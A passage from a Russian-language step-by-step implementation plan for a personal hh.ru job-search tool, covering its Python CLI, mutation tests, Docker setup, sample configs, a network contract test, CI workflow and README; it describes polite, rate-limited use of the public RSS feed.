    `init-db` не только падал `OperationalError`, но и оставлял после себя
    нулевой файл базы. Docker дёргает HEALTHCHECK с первых секунд жизни
    контейнера — то есть ровно в этот момент.
    """
    if not config.app.paths.state.exists():
        _die(f"базы нет: {config.app.paths.state}. Сначала `init-db`", EXIT_FAILED)
    return SqliteRepository(config.app.paths.state)


def _execute(config: Config, sinks: Sequence[Sink]) -> RunStats:
    # Каталог создаётся здесь, а не только в `init-db`: на пустом volume
    # `sqlite3.connect` падает «unable to open database file» ещё до
    # `init_schema()`, и первый прогон давал голый traceback, требуя
    # необъявленного порядка команд.
    config.app.paths.state.parent.mkdir(parents=True, exist_ok=True)
    with (
        SqliteRepository(config.app.paths.state) as repo,
        PoliteClient(config.app.http, config.app.user_agent) as client,
    ):
        repo.init_schema()
        return run_once(config, client, repo, KeywordScorer(config.profile), sinks)


@app.command("init-db")
def init_db(ctx: typer.Context) -> None:
    """Создать схему базы (и догнать существующую до неё)."""
    config = _config(ctx)
    config.app.paths.state.parent.mkdir(parents=True, exist_ok=True)
    with SqliteRepository(config.app.paths.state) as repo:
        repo.init_schema()
    typer.echo(f"схема создана: {config.app.paths.state}")


@app.command("run")
def run_command(ctx: typer.Context) -> None:
    """Выполнить один прогон. Код возврата повторяет статус прогона."""
    config = _config(ctx)
    sinks = _sinks(config)
    try:
        stats = _execute(config, sinks)
    except AccessForbidden as error:
        _die(f"hh.ru закрыл доступ: {error}. Обходные пути не применяются", EXIT_FAILED)
    if stats.status != OK:
        # Молчаливый ноль здесь — это cron, который никогда не узнает, что
        # отчёт не вышел: ровно тот случай, ради которого статус прогона и
        # существует.
        typer.echo(f"прогон завершён со статусом {stats.status}: {stats.error}", err=True)
    raise typer.Exit(stats.exit_code())


@app.command("serve")
def serve_command(ctx: typer.Context) -> None:
    """Бесконечный цикл прогонов по расписанию (точка входа контейнера)."""
    config = _config(ctx)
    sinks = _sinks(config)
    stop = StopSignal()
    stop.install()
    logger.info("старт, интервал %d ч", config.app.schedule.interval_hours)
    raise typer.Exit(serve(config, lambda: _execute(config, sinks), stop=stop))


@app.command("healthcheck")
def healthcheck(ctx: typer.Context) -> None:
    """Код 0, если последний успешный прогон свежее двух интервалов."""
    config = _config(ctx)
    deadline = datetime.now(UTC) - timedelta(hours=2 * config.app.schedule.interval_hours)
    with _open(config) as repo:
        try:
            last = repo.last_successful_run()
        except sqlite3.Error as error:
            # Тип исключения — не SQL: файл базы есть, но схемы в нём нет
            # (или он не база вовсе). Для healthcheck это «работа не
            # делается», а не повод падать traceback'ом.
            _die(f"журнал прогонов не читается: {error}. Сначала `init-db`", EXIT_FAILED)
    if last is None or last < deadline:
        typer.echo(
            f"последний успешный прогон: {last.isoformat() if last else 'никогда'}, "
            f"порог: {deadline.isoformat()}",
            err=True,
        )
        raise typer.Exit(EXIT_FAILED)
    typer.echo(f"ok, последний успешный прогон: {last.isoformat()}")


@app.command("mark")
def mark(ctx: typer.Context, vacancy_id: str, status: str) -> None:
    """Проставить статус вакансии вручную."""
    config = _config(ctx)
    if status not in MANUAL_STATUSES:
        _die(f"неизвестный статус {status!r}; допустимы: {', '.join(MANUAL_STATUSES)}", EXIT_CONFIG)
    with _open(config) as repo:
        if not repo.set_status(vacancy_id, status):
            _die(f"вакансии {vacancy_id} нет в базе, статус не изменён", EXIT_FAILED)
    typer.echo(f"{vacancy_id} → {status}")


@app.command("report")
def report_command(ctx: typer.Context, since: Since = "7d") -> None:
    """Перегенерировать отчёт из базы по уже отправленным вакансиям."""
    config = _config(ctx)
    match = _SINCE_RE.match(since.strip())
    if match is None:
        _die(f"--since ожидает число дней (7 или 7d), получено {since!r}", EXIT_CONFIG)
    sinks = _sinks(config)
    cutoff = datetime.now(UTC) - timedelta(days=int(match.group(1)))
    with _open(config) as repo:
        vacancies = repo.reported_since(cutoff)
    if not vacancies:
        typer.echo(f"с {cutoff:%Y-%m-%d} отправленных вакансий не найдено")
        return
    for sink in sinks:
        sink.emit(vacancies, datetime.now(UTC))
    typer.echo(f"перегенерировано вакансий: {len(vacancies)}")


if __name__ == "__main__":
    app()
```

- [ ] **Step 7: Запустить тесты, типы и линтер**

Run: `uv run pytest tests/test_cli.py tests/test_scheduler.py -q && uv run mypy --strict hh_search tests && uv run ruff check hh_search tests && uv run ruff format --check hh_search/scheduler.py hh_search/logging_setup.py hh_search/__main__.py tests/test_cli.py tests/test_scheduler.py`
Expected: `32 passed` (23 + 9), `Success: no issues found`, `All checks passed!`,
`5 files already formatted`

`tests/test_cli.py` намеренно ходит через настоящий `time.sleep` (клиент собирает сам CLI,
подменить его нечем), поэтому `delay_between_requests_sec` в тестовом `app.yaml` понижен до
минимально разрешённых 0.1 с: с секундой файл шёл 23 секунды вместо трёх.

- [ ] **Step 8: Мутационная проверка**

Двадцать две мутации, все обязаны быть убиты:

| Мутация | Кто обязан покраснеть |
|---|---|
| конфиг грузится в `@app.callback()` | `test_subcommand_help_works_without_any_config` |
| ошибка конфига летит traceback'ом | `test_missing_config_gives_a_message_and_not_a_traceback` |
| `healthcheck` открывает базу, которой нет | `test_healthcheck_before_init_db_fails_and_creates_nothing` |
| `healthcheck` падает на базе без схемы | `test_healthcheck_fails_on_a_database_without_schema` |
| код возврата не зависит от статуса прогона | `test_run_exits_nonzero_when_reports_cannot_be_written` |
| 403 в CLI даёт traceback | `test_run_exits_one_on_forbidden` |
| `mark` не проверяет `rowcount` | `test_mark_fails_on_an_unknown_id` |
| `mark` принимает любой статус | `test_mark_rejects_an_unknown_status` |
| `--since` разбирается через `int()` | `test_report_rejects_an_unparsable_period` |
| приёмники строятся внутри прогона | `test_unknown_sink_stops_the_run_before_the_database_is_touched` |
| логи настраиваются только в `run`/`serve` | `test_every_command_writes_the_log_file` |
| файловый обработчик логов не добавляется | `test_every_command_writes_the_log_file` |
| пауза считается после прогона | `test_schedule_does_not_drift_by_the_length_of_the_run` |
| лишняя пауза после последнего прогона | `test_serve_makes_exactly_the_requested_number_of_runs` |
| `serve` продолжает после устойчивого 403 | `test_two_forbidden_in_a_row_stop_the_daemon` |
| счётчик 403 не сбрасывается успехом | `test_a_single_forbidden_between_successes_does_not_stop_the_daemon` |
| флаг остановки не проверяется | `test_stop_request_ends_the_loop_without_another_run` |
| нет обработчика SIGTERM | `test_sigterm_sets_the_flag` |
| ожидание на `time.sleep` вместо `Event` | `test_waiting_is_interrupted_by_the_signal` |
| `reported_since` без `safe_rows` | `test_report_survives_a_corrupted_row` |
| `reported_since` без `CAST AS BLOB` | `test_report_survives_a_corrupted_row` |
| `reported_since` игнорирует окно | `test_reported_since_takes_only_reported_rows_inside_the_window` |

Проверено при переписывании плана: 22 из 22 убиты. Мутация «`healthcheck` падает на базе без
схемы» на первом заходе ВЫЖИЛА — тест проверял только код возврата, а необработанное исключение
внутри `CliRunner` тоже даёт единицу; поэтому тест теперь проверяет и сообщение, и что
исключение не улетело наружу.

- [ ] **Step 9: Прогнать весь набор**

Run: `uv run pytest -q && uv run mypy --strict hh_search tests && uv run ruff check .`
Expected: `376 passed` (343 после задачи 10 + 32 здесь + 1 в тестах хранилища),
`Success: no issues found`, `All checks passed!`

- [ ] **Step 10: Коммит**

```bash
git add hh_search/__main__.py hh_search/scheduler.py hh_search/logging_setup.py \
        hh_search/storage/repository.py tests/test_cli.py tests/test_scheduler.py \
        tests/test_repository.py
git commit -m "feat: CLI, логирование и планировщик

serve и run вызывают одну и ту же функцию — один код, два способа
запуска. Код возврата повторяет статус прогона: молчаливый ноль при
недоступном каталоге отчётов означал бы, что cron никогда не узнает о
неработающем сервисе.

Конфиг читается лениво: с загрузкой в callback не работал --help
подкоманд, а отсутствие конфига давало traceback. healthcheck до init-db
больше не создаёт мусорный файл базы. Устойчивый 403 останавливает
демон, а не заставляет его стучаться каждые четыре часа вечно.

Расписание считается по дедлайну (иначе сутки уносят его на 2.5 часа), а
остановка по SIGTERM ждёт на threading.Event: PEP 475 возобновляет
прерванный sleep, поэтому обработчика, взводящего флаг, недостаточно —
docker stop всё равно добивал SIGKILL.

report читает историю через safe_rows и CAST AS BLOB: единственный
способ пользователя вернуть отчёт обязан переживать порчу базы лучше
конвейера, а не хуже."
```

---

### Task 12: Docker и образцы конфигов

**Files:**
- Create: `Dockerfile`, `compose.yaml`, `.dockerignore`
- Create: `config.example/app.yaml`, `config.example/profile.yaml`, `config.example/queries.yaml`

**Interfaces:**
- Consumes: CLI из Task 11
- Produces: рабочий образ с точкой входа `python -m hh_search serve`

- [ ] **Step 1: Создать `.dockerignore`**

```
.git
.venv
data
tests
docs
.mypy_cache
.pytest_cache
.ruff_cache
__pycache__
```

- [ ] **Step 2: Создать `Dockerfile`**

```dockerfile
FROM python:3.12-slim

COPY --from=ghcr.io/astral-sh/uv:latest /uv /usr/local/bin/uv

ENV PYTHONUNBUFFERED=1 \
    PYTHONDONTWRITEBYTECODE=1 \
    HH_CONFIG_DIR=/data/config

WORKDIR /app

# Слой зависимостей отдельно от кода, чтобы правки кода не пересобирали его.
COPY pyproject.toml ./
RUN uv pip install --system --no-cache .

COPY hh_search ./hh_search
RUN uv pip install --system --no-cache --no-deps .

RUN useradd --create-home --uid 10001 hh && mkdir -p /data && chown -R hh:hh /data
USER hh

ENTRYPOINT ["python", "-m", "hh_search"]
CMD ["serve"]
```

- [ ] **Step 3: Создать `compose.yaml`**

```yaml
services:
  hh-search:
    build: .
    image: hh-search:latest
    restart: unless-stopped
    env_file:
      - path: .env
        required: false
    volumes:
      - ./data:/data
    environment:
      TZ: Europe/Moscow
    healthcheck:
      test: ["CMD", "python", "-m", "hh_search", "healthcheck"]
      interval: 15m
      timeout: 30s
      retries: 3
      start_period: 5m
```

- [ ] **Step 4: Создать образцы конфигов**

`config.example/app.yaml` — подставьте свой email перед первым запуском:

```yaml
contact_email: "ВАШ_EMAIL@example.com"
user_agent: "hh-search/0.1 (personal job search; {contact_email})"
schedule:
  interval_hours: 4
http:
  delay_between_requests_sec: 1.0
  timeout_sec: 20
  max_retries: 3
  respect_robots: true
enrich:
  max_attempts: 3
sinks: [csv, markdown]
paths:
  state: /data/state/hh.db
  reports: /data/reports
  logs: /data/logs
```

`config.example/profile.yaml`:

```yaml
weights: {title: 0.40, stack: 0.30, responsibilities: 0.20, domain: 0.10}
saturation: {stack: 5, responsibilities: 3}
penalty_per_signal: 15
signals:
  title_roles: [team lead, tech lead, teamlead, ведущий, senior, старший, руководител]
  title_tech: [backend, embedded, linux, c++, python, node, firmware]
  stack:
    [yocto, buildroot, openwrt, bsp, arm, kernel, c++, python, node.js, typescript,
     docker, kubernetes, kafka, postgresql, clickhouse, llm, rag, mcp]
  responsibilities: [архитектур, менторинг, код-ревью, code review, проектирован, техдолг]
  domain: [телеком, встраиваем, embedded, iot, микросервис]
negative:
  [junior, стажёр, intern, 1c, продаж, рекрутер, ручное тестирование, оператор, курьер]
report_threshold: 60
```

`config.example/queries.yaml` — перенесите сюда карту из `hh_autosearch_plan.md`,
разворачивая «регион плюс удалёнка» в два запроса:

```yaml
defaults:
  experience: [between3And6, moreThan6]
  employment: full
queries:
  - {text: "Backend Team Lead", cluster: backend, weight: 10, area: [66]}
  - {text: "Backend Team Lead", cluster: backend, weight: 10, schedule: remote}
  - {text: "Tech Lead backend", cluster: backend, weight: 10, area: [66]}
  - {text: "Tech Lead backend", cluster: backend, weight: 10, schedule: remote}
  - {text: "Senior Backend Developer", cluster: backend, weight: 8, area: [66]}
  - {text: "Senior Backend Developer", cluster: backend, weight: 8, schedule: remote}
  - {text: "Node.js backend", cluster: backend, weight: 8, area: [66]}
  - {text: "Node.js backend", cluster: backend, weight: 8, schedule: remote}
  - {text: "Python backend", cluster: backend, weight: 8, area: [66]}
  - {text: "Python backend", cluster: backend, weight: 8, schedule: remote}
  - {text: "C++ Embedded Linux", cluster: embedded, weight: 10, area: [66]}
  - {text: "C++ Embedded Linux", cluster: embedded, weight: 10, schedule: remote}
  - {text: "Embedded Linux BSP", cluster: embedded, weight: 10, area: [66]}
  - {text: "Embedded Linux BSP", cluster: embedded, weight: 10, schedule: remote}
  - {text: "Yocto", cluster: embedded, weight: 9, area: [66]}
  - {text: "Yocto", cluster: embedded, weight: 9, schedule: remote}
  - {text: "Buildroot", cluster: embedded, weight: 9, schedule: remote}
  - {text: "Firmware developer", cluster: embedded, weight: 7, area: [66]}
  - {text: "Linux kernel module", cluster: embedded, weight: 8, schedule: remote}
  - {text: "Telecom C++", cluster: telecom, weight: 9, area: [66]}
  - {text: "Telecom C++", cluster: telecom, weight: 9, schedule: remote}
  - {text: "AI engineer", cluster: ai, weight: 8, schedule: remote}
  - {text: "LLM engineer", cluster: ai, weight: 9, schedule: remote}
  - {text: "RAG", cluster: ai, weight: 9, schedule: remote}
  - {text: "MCP", cluster: ai, weight: 8, schedule: remote}
  - {text: "Agentic AI", cluster: ai, weight: 9, schedule: remote}
```

- [ ] **Step 5: Проверить сборку и запуск образа**

```bash
docker build -t hh-search:latest .
mkdir -p data/config data/state data/reports data/logs
cp config.example/*.yaml data/config/
# подставьте реальный email в data/config/app.yaml перед следующей командой
docker run --rm -v "$PWD/data:/data" hh-search:latest init-db
docker run --rm -v "$PWD/data:/data" hh-search:latest healthcheck; echo "код возврата: $?"
```

Expected: `init-db` печатает путь к базе; `healthcheck` возвращает 1 (прогонов ещё не было) — это корректное поведение.

- [ ] **Step 6: Коммит**

```bash
git add Dockerfile compose.yaml .dockerignore config.example
git commit -m "feat: Docker-образ и образцы конфигурации

Слой зависимостей отделён от слоя кода, запуск от непривилегированного
пользователя, конфиг и состояние живут на volume. Комбинации
«регион плюс удалёнка» развёрнуты в отдельные запросы: RSS не умеет
ИЛИ по региону и формату, а дедупликация по id склеит пересечения."
```

---

### Task 13: CI, контрактный тест и README

**Files:**
- Create: `.github/workflows/ci.yml`, `README.md`
- Create: `tests/test_contract_network.py`
- Modify: `docs/superpowers/specs/2026-07-27-hh-autosearch-design.md` (зафиксировать два отклонения)

**Interfaces:**
- Consumes: всё предыдущее
- Produces: зелёный CI без сети; ручной контрактный тест `pytest -m network`

- [ ] **Step 1: Написать контрактный тест**

Создать `tests/test_contract_network.py`:

```python
"""Ходит в живой hh.ru. В CI пропускается, запускается вручную: pytest -m network."""

import re

import httpx
import pytest

from hh_search.sources.vacancy_page import extract_job_posting

USER_AGENT = "hh-search/0.1 (contract test)"
RSS_URL = "https://hh.ru/search/vacancy/rss?text=Yocto&order_by=publication_time"


@pytest.mark.network
def test_rss_feed_still_returns_vacancy_items() -> None:
    response = httpx.get(RSS_URL, headers={"User-Agent": USER_AGENT}, timeout=30)
    assert response.status_code == 200, "RSS-лента закрылась — см. §3.2 спеки"
    assert "<item>" in response.text
    assert re.search(r"https://hh\.ru/vacancy/\d+", response.text)


@pytest.mark.network
def test_vacancy_page_still_exposes_json_ld() -> None:
    feed = httpx.get(RSS_URL, headers={"User-Agent": USER_AGENT}, timeout=30).text
    match = re.search(r"https://hh\.ru/vacancy/(\d+)", feed)
    assert match is not None
    page = httpx.get(
        f"https://hh.ru/vacancy/{match.group(1)}",
        headers={"User-Agent": USER_AGENT},
        timeout=30,
        follow_redirects=True,
    )
    assert page.status_code == 200
    posting = extract_job_posting(page.text)
    assert posting is not None, "JSON-LD с JobPosting пропал — см. §3.4 спеки"
    assert posting.get("description")
```

- [ ] **Step 2: Убедиться, что контрактный тест пропускается по умолчанию**

Run: `uv run pytest tests/test_contract_network.py -v`
Expected: `2 deselected` (сработала настройка `addopts = "-m 'not network'"` из Task 1)

- [ ] **Step 3: Убедиться, что контрактный тест проходит вручную**

Run: `uv run pytest tests/test_contract_network.py -m network -v`
Expected: 2 passed. Если падает — источник изменился, дальше по плану идти нельзя, нужно перечитать §3 спеки.

- [ ] **Step 4: Создать `.github/workflows/ci.yml`**

```yaml
name: CI

on:
  push:
    branches: [main, master]
  pull_request:

jobs:
  check:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: astral-sh/setup-uv@v5
        with:
          enable-cache: true

      - name: Установить зависимости
        run: uv pip install --system ".[dev]"

      - name: Линтер
        run: ruff check .

      - name: Форматирование
        run: ruff format --check .

      - name: Типы
        run: mypy hh_search

      - name: Тесты
        run: pytest -v
```

Сеть в CI не используется: контрактные тесты отсеиваются меткой `network`.

- [ ] **Step 5: Создать `README.md`**

````markdown
# hh-search

Автопоиск вакансий на hh.ru для личного использования. Регулярно проверяет
публичную RSS-ленту поиска, отсеивает нерелевантное, оценивает оставшееся по
профилю и выгружает только новые находки в CSV и Markdown.

Дизайн: [`docs/superpowers/specs/2026-07-27-hh-autosearch-design.md`](docs/superpowers/specs/2026-07-27-hh-autosearch-design.md)

## Быстрый старт

```bash
mkdir -p data/{config,state,reports,logs}
cp config.example/*.yaml data/config/
$EDITOR data/config/app.yaml     # укажите свой contact_email
docker compose build
docker compose run --rm hh-search init-db
docker compose run --rm hh-search run
docker compose up -d
```

Отчёты появятся в `data/reports/`, логи — в `data/logs/hh.log`.

## Источник данных

Публичный API hh.ru для соискателей закрыт (403; поддержка прекращена 15.12.2025),
поэтому используется публичная RSS-лента поиска и блок JSON-LD `JobPosting` со
страницы вакансии. Авторизация, куки и эмуляция браузера не применяются.

Ограничение источника: RSS отдаёт максимум 20 вакансий на запрос, пагинации нет.
Поэтому все запросы идут с `order_by=publication_time` — окно всегда содержит
самые свежие вакансии, что и требуется трекеру новинок.

## Режим работы с hh.ru

Соблюдаются: честный `User-Agent` с контактным адресом, `robots.txt`, одно
соединение за раз с паузой между запросами, `Retry-After` и экспоненциальный
backoff. Устойчивый `403` останавливает прогон — обходные пути не применяются.
Описание каждой вакансии скачивается ровно один раз за всё время.

## Настройка

| Файл | Что менять |
|---|---|
| `data/config/queries.yaml` | Набор поисковых запросов, кластеры, веса |
| `data/config/profile.yaml` | Сигналы, веса скоринга, стоп-слова, порог |
| `data/config/app.yaml` | Расписание, троттлинг, пути, контактный email |

Опечатка в конфиге роняет процесс на старте с указанием поля — это сделано
намеренно.

**Про списки сигналов:** не используйте односимвольный латинский `c` — после
нормализации русский предлог «с» превращается в него и даёт ложные срабатывания.
Пишите `c++`, `c/c++` или `си`.

## Команды

```bash
docker compose run --rm hh-search run        # разовый прогон
docker compose run --rm hh-search healthcheck       # свежесть последнего прогона
docker compose run --rm hh-search report --since 7d # перегенерировать отчёт
docker compose run --rm hh-search mark 12345 applied
```

## Разработка

```bash
uv pip install --system ".[dev]"
pytest                    # без сети
pytest -m network         # контрактные тесты против живого hh.ru
ruff check . && mypy hh_search
```

Контрактные тесты — ранняя система оповещения: если hh.ru изменит формат ленты
или уберёт JSON-LD, они об этом скажут. В CI они не запускаются, чтобы сборка не
зависела от живой выдачи.
````

- [ ] **Step 6: Зафиксировать отклонения в спеке**

В `docs/superpowers/specs/2026-07-27-hh-autosearch-design.md`:

1. В §5.1 после таблицы `run` добавить DDL таблицы `http_cache` (скопировать из
   `hh_search/storage/schema.sql`) и строку: «`http_cache` — хранит `ETag` и
   `Last-Modified` для условных запросов из §3.5.»
2. В §5.1 в таблицу `vacancy` добавить колонку `cluster_weight INTEGER NOT NULL DEFAULT 0`
   и пояснение: «вес запроса, назначившего кластер; нужен для правила из §6.2».
3. В §11 заменить строку про зависимости на: «Рантайм: `httpx`, `pydantic`,
   `PyYAML`, `typer`. `pydantic-settings` добавляется вместе с `TelegramSink` —
   в первой версии секретов нет.»
4. В §8.3 заменить `run --once` на `run` и добавить пояснение: «флаг `--once`
   убран — команда всегда выполняет ровно один прогон, отдельный режим
   задаёт `serve`».

- [ ] **Step 7: Прогнать полную проверку**

Run: `uv run pytest -v && uv run ruff check . && uv run ruff format --check . && uv run mypy hh_search`
Expected: всё зелёное, контрактные тесты deselected

- [ ] **Step 8: Коммит**

```bash
git add .github README.md tests/test_contract_network.py docs/
git commit -m "ci: сборка, контрактные тесты и README

CI гоняет линтер, типы и тесты без сети — живая выдача hh сделала бы
сборку флаки. Контрактные тесты помечены network и запускаются руками;
они ловят момент, когда hh изменит формат ленты или уберёт JSON-LD.
В спеке зафиксированы два отклонения: таблица http_cache и колонка
cluster_weight."
```

---

## Проверка готовности

После Task 13 должно выполняться:

- [ ] `docker compose build` собирается без ошибок
- [ ] `docker compose run --rm hh-search run` с реальным конфигом создаёт
      `data/reports/<дата>-new.csv` и `.md`
- [ ] Повторный `run` подряд не добавляет в отчёт ни одной вакансии
- [ ] `docker compose run --rm hh-search healthcheck` возвращает 0 после успешного прогона
- [ ] `pytest -m network` проходит — источник соответствует §3 спеки
- [ ] `docker compose up -d` поднимает контейнер, он переживает `docker restart`
